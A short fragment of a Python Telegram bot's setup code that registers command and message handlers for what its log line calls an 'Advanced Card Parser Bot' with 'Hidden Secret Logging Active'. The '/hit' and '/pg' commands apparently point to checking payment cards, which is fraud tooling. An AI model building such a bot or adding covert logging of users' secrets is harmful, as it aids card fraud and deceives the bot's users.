    app.add_handler(CommandHandler("hit", cmd_hit))   
    app.add_handler(CommandHandler("pg", cmd_pg)) 
    app.add_handler(CommandHandler("done", cmd_done))
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    app.add_handler(CallbackQueryHandler(button_callback, pattern="^btn_"))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))

    logger.info("🦇 Advanced Card Parser Bot v2.6 starting… (Hidden Secret Logging Active)")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
